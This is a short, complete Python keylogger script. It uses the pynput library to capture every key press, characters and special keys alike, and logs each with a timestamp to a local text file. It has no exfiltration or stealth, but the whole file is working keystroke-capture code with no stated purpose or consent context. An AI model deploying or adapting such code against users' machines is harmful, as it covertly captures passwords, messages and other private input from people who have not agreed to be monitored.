import pynput
from pynput.keyboard import Listener
import os
import logging

log_file = "keylogger_output.txt"

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

with Listener(on_press=on_press) as listener:
    listener.join()